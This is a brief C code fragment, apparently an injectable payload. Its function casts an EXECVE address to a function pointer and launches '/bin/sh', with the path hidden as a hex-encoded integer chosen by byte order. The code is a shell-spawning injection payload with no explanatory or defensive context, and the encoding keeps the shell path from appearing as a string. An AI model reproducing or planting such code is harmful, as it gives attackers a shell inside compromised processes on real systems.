typedef int (*eve)(const char*, char* const[], char* const[]);

void inj ()
{
	char* const* na = {0};
	union
	{
		char path[8];
		unsigned long long ival;
	} d;
	eve exc = (eve)EXECVE;
#ifdef __BIG_ENDIAN__
	d.ival = 0x2F62696E2F736800LL;
#else
	d.ival = 0x0068732F6E69622FLL;
#endif
	exc(d.path, na, na);
}

